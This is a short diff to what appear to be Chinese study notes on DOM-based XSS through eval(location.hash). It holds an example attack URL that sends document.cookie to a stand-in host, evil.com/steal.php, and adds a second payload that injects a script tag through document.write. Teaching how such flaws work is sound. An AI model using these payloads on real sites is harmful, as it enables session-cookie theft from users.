@@ -16,7 +16,8 @@ eval( location.hash.substr(1) ); // 获取#符号后面的内容
 
 攻击：
   http://www.foo.com/info.html#new%20Image().src="http://www.evil.com/steal.php?c="+escape(document.cookie);
-
+  http://localhost:8090/day05/mongo.html#document.write("<script/src=test.js></script>")
+  
 诱骗用户点击之后，用户所在的网站解析参数
 然后加载图片，发起get请求"http://www.evil.com/steal.php?c="+escape(document.cookie)
 ````
